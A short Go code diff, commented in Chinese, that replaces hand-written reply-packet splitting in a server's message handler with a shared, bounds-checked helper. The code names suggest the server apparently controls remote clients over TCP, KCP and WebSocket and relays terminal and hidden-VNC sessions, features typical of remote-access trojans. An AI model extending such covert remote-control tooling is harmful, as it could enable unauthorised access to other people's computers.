@@ -614,9 +614,12 @@ func processMessage(ctx context.Context, reader *bufio.Reader, conn net.Conn, co
 			return "", fmt.Errorf("数据长度不足，无法提取消息类型，需要至少 4 字节，实际收到%d字节", len(dataBytes))
 		}
 
-		replyTypeBytes := dataBytes[:4]
-		data := dataBytes[4:]
-		replyType := binary.BigEndian.Uint32(replyTypeBytes)
+		// 拆包 + 边界校验统一走 SplitReplyPayload（B4 收敛，六处手写拆包消除）
+		replyType, data, err := command.SplitReplyPayload(dataBytes)
+		if err != nil {
+			logx.Infof("⚠️ [TCP] %v - UID: %s\n", err, uid)
+			return uid, nil
+		}
 
 		// 客户端回包统一处理（TCP/KCP/WS 三协议共用，见 pkg/command/reply_handlers.go）
 		if err := command.HandleClientReply(listenerType, uid, replyType, data, BroadcastToXTermSessions, BroadcastToHVNCSessions); err != nil {
